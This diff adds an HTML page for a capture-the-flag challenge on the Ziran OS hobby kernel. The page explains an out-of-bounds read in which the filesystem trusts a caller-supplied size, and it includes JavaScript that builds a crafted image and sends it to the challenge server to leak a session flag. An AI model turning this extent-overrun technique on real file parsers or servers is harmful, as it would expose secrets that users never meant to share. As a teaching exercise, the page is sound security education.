@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Ziran OS — Filesystem CTF, Tier 2 (remote capture)</title>
+  <link rel="stylesheet" href="./vendor/xterm.css">
+  <style>
+    :root { color-scheme: dark; }
+    body { background:#0b0e14; color:#cdd6f4; font-family:system-ui,sans-serif; margin:0; padding:1rem 1.25rem 4rem; line-height:1.5; }
+    h1 { font-size:1.15rem; margin:.2rem 0; }
+    h2 { font-size:1rem; margin:1.4rem 0 .4rem; color:#f9e2af; }
+    p, li { max-width:74ch; }
+    .note { opacity:.8; font-size:.88rem; }
+    code, kbd { color:#a6e3a1; font-family:ui-monospace,monospace; }
+    a { color:#89b4fa; }
+    #terminal { height:60vh; margin-top:.5rem; }
+    #status { font-size:.8rem; opacity:.7; margin-top:.4rem; min-height:1.2em; }
+    .panel { background:#11151f; border:1px solid #1e2536; border-radius:8px; padding:.9rem 1rem; margin-top:1rem; }
+    button { background:#1e2536; color:#cdd6f4; border:1px solid #45507a; border-radius:6px; padding:.5rem .9rem; font-size:.9rem; cursor:pointer; }
+    button:hover { background:#28304a; } button.primary { background:#3651a8; border-color:#5670d0; } button:disabled { opacity:.5; cursor:default; }
+    details { margin:.5rem 0; border-left:2px solid #313a52; padding-left:.8rem; } summary { cursor:pointer; color:#89b4fa; font-size:.92rem; }
+    .banner { background:#2a1e1e; border:1px solid #6d3b3b; border-radius:8px; padding:.7rem .9rem; font-size:.85rem; }
+    .capture { display:none; background:#12261a; border:1px solid #2e6b3f; border-radius:8px; padding:.9rem 1rem; margin-top:1rem; }
+    .capture.show { display:block; } .capture h2 { margin:.1rem 0 .4rem; color:#a6e3a1; }
+    .flag { font-family:ui-monospace,monospace; color:#a6e3a1; word-break:break-all; }
+    footer { margin-top:2rem; padding-top:1rem; border-top:1px solid #1e2536; font-size:.82rem; opacity:.75; }
+    .dim { opacity:.7; }
+  </style>
+</head>
+<body>
+  <h1>Ziran OS — Filesystem CTF <span class="dim">· Tier 2 (remote capture)</span></h1>
+  <p class="note">
+    This kernel runs on a <b>server</b>, not in your tab. A unique <code>FLAG{…}</code>
+    was minted for your session and injected into that instance's RAM — it is
+    <b>not in this page, not in the repo, and not in any bytes you're given.</b> The
+    only way to get it is to make the filesystem hand it to you over the wire.
+    <a href="./ctf.html">← Tier 1 (practice, in your browser)</a>
+  </p>
+
+  <div class="banner">
+    <b>Why this one is real.</b> In Tier 1 the flag is in your own image, so
+    <code>strings</code>/DevTools reach it — it's a sandbox to learn the bug. Here the
+    secret lives only in the server, so nothing local reveals it. You develop the
+    exploit against Tier 1, then <b>land it here</b> to capture a flag you genuinely
+    could not see. The bug: the server's reader trusts the length in <i>your</i>
+    header, so a file extent that runs off the end of your upload reads the flag the
+    host appended right after it.
+  </div>
+
+  <div id="terminal"></div>
+  <div id="status">connecting…</div>
+
+  <div class="capture" id="capture">
+    <h2>🚩 Captured!</h2>
+    <p>You made the remote filesystem hand you a flag that was only ever in its RAM:
+      <span class="flag" id="capture-flag"></span></p>
+    <p class="note">
+      That's a real remote capture — the same length-confusion primitive as Tier 1,
+      but the secret was never in anything you were given.
+      <a href="https://github.com/kenlacroix/ZiranOS/issues/new?template=ctf-writeup.md" target="_blank" rel="noopener">Submit a writeup</a>
+      to get on the <a href="https://github.com/kenlacroix/ZiranOS/blob/HEAD/SOLVERS.md" target="_blank" rel="noopener">solvers list</a>.
+    </p>
+  </div>
+
+  <div class="panel">
+    <h2 style="margin-top:.2rem">Land the exploit</h2>
+    <p class="note">
+      One click drives it: it uploads a crafted image whose one file's extent points
+      just past your own bytes — into the 64-byte region where the host appended your
+      session flag — then <code>cat</code>s it. Or type it by hand in the terminal.
+    </p>
+    <div style="display:flex; gap:.5rem; align-items:center; flex-wrap:wrap">
+      <button class="primary" id="run">▸ Run the capture</button>
+      <span class="note" id="run-status"></span>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h2 style="margin-top:.2rem">Walkthrough <span class="dim">(spoilers)</span></h2>
+    <details><summary>The layout</summary><p class="note">
+      On upload the server builds one buffer: <code>[ your image (N bytes) | your flag (64) ]</code>.
+      You're told the disk is only your <code>N</code> bytes — but the whole buffer is
+      mounted, and the flag sits at exactly <code>[N, N+64)</code>.</p></details>
+    <details><summary>The bug</summary><p class="note">
+      The reader believes the <code>total_size</code> in your header instead of the
+      real buffer length, and leaves extents unconfined. So a file entry with
+      <code>offset = N, length = 64</code> passes validation and reads straight into
+      the appended flag — bytes you never uploaded. "Validating against a length the
+      caller supplies is not validation."</p></details>
+    <details><summary>By hand</summary><p class="note">
+      Craft a minimal 48-byte ZranFS image (superblock + one file entry) whose file's
+      <code>offset</code> is 48 and <code>length</code> is 64, base64 it, then in the
+      terminal: <code>load</code> ⏎, paste, <code>.</code> ⏎, <code>cat /loot</code>.</p></details>
+  </div>
+
+  <footer>
+    <span style="font-family:ui-monospace,monospace">自然 · Ziran OS</span> — a from-scratch x86-64 hobby OS.
+    Built by <a href="https://www.kennethlacroix.me" target="_blank" rel="noopener">Kenneth LaCroix</a> ·
+    <a href="https://github.com/kenlacroix/ZiranOS" target="_blank" rel="noopener">source</a> ·
+    <a href="./index.html">guided tour</a>
+  </footer>
+
+  <script type="module">
+    import './vendor/xterm.js'; // window.Terminal
+
+    // The bridge endpoint. Default to the tunnel host; override for testing with
+    // ?ws=wss://host/ (or ws://127.0.0.1:8080/ against a local bridge).
+    const WS_URL = new URLSearchParams(location.search).get('ws') || 'wss://ctf.kennethlacroix.me/';
+    const status = (t) => { document.getElementById('status').textContent = t; };
+    const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+    const dec = new TextDecoder();
+
+    const term = new Terminal({ cols: 100, rows: 26, convertEol: true });
+    term.open(document.getElementById('terminal'));
+    term.focus();
+
+    // ---- capture detection: the server's per-session flag format ----------------
+    let captured = false, seen = '';
+    const FLAG_RE = /FLAG\{ziran-tier2-[0-9a-f]+\}/;
+    const origWrite = term.write.bind(term);
+    term.write = (data, cb) => {
+      const s = typeof data === 'string' ? data : dec.decode(data);
+      seen = (seen + s).slice(-4096);
+      const m = seen.match(FLAG_RE);
+      if (m && !captured) {
+        captured = true;
+        document.getElementById('capture-flag').textContent = m[0];
+        const el = document.getElementById('capture');
+        el.classList.add('show');
+        el.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+      }
+      return origWrite(data, cb);
+    };
+
+    // ---- WebSocket transport: terminal <-> the bridge's serial pipe -------------
+    let ws;
+    function connect() {
+      status('connecting to ' + WS_URL + ' …');
+      ws = new WebSocket(WS_URL);
+      ws.binaryType = 'arraybuffer';
+      ws.onopen = () => status('connected — the server is booting the kernel…');
+      ws.onmessage = (e) => term.write(typeof e.data === 'string' ? e.data : new Uint8Array(e.data));
+      ws.onclose = (e) => status('disconnected (' + (e.reason || 'code ' + e.code) + '). reload to reconnect.');
+      ws.onerror = () => status('connection error — the server may be busy or down.');
+      term.onData((d) => { if (ws && ws.readyState === WebSocket.OPEN) ws.send(d); });
+    }
+    connect();
+
+    // ---- the Tier-2 crafted image (built in-page) ------------------------------
+    const enc = new TextEncoder();
+    // 48 bytes: superblock + one file entry "loot" whose extent [48, 112) points past
+    // the upload, into the 64-byte flag region the host appends right after it.
+    function craftedImage() {
+      const SB = 16, DIRENT = 32, n = SB + DIRENT; // 48
+      const b = new Uint8Array(n);
+      const le16 = (o, v) => { b[o] = v & 255; b[o + 1] = (v >> 8) & 255; };
+      const le32 = (o, v) => { b[o] = v & 255; b[o + 1] = (v >> 8) & 255; b[o + 2] = (v >> 16) & 255; b[o + 3] = (v >> 24) & 255; };
+      b.set(enc.encode('ZRFS'), 0);
+      le16(4, 3);            // version
+      le16(6, 1);            // file_count
+      le32(8, n);            // total_size = 48 (honest — the header the reader trusts)
+      le32(12, n);           // data_end = 48
+      b.set(enc.encode('loot'), 16);   // entry name (NUL-padded to 20)
+      le32(16 + 20, n);      // offset = 48  -> into the appended flag region
+      le32(16 + 24, 64);     // length = 64  -> the whole flag region
+      le32(16 + 28, 0);      // kind = file
+      return b;
+    }
+    const toB64 = (u8) => { let s = ''; for (const x of u8) s += String.fromCharCode(x); return btoa(s); };
+
+    async function runCapture() {
+      const send = (s) => { if (ws && ws.readyState === WebSocket.OPEN) ws.send(s); };
+      if (!ws || ws.readyState !== WebSocket.OPEN) { return 'not connected'; }
+      const b64 = toB64(craftedImage());
+      term.focus();
+      send('load\r');
+      await sleep(400);                       // let cmd_load reach its read loop
+      for (let i = 0; i < b64.length; i += 40) { send(b64.slice(i, i + 40) + '\r'); await sleep(20); }
+      send('.\r');                            // end-of-image sentinel
+      await sleep(700);
+      send('cat /loot\r');                    // read the crafted file -> leaks the flag
+      return 'sent';
+    }
+
+    document.getElementById('run').onclick = async () => {
+      const btn = document.getElementById('run');
+      const st = document.getElementById('run-status');
+      btn.disabled = true;
+      st.textContent = 'driving the exploit…';
+      const r = await runCapture();
+      st.textContent = r === 'sent' ? 'sent — watch the terminal for FLAG{…}' : r;
+      btn.disabled = false;
+    };
+  </script>
+</body>
+</html>
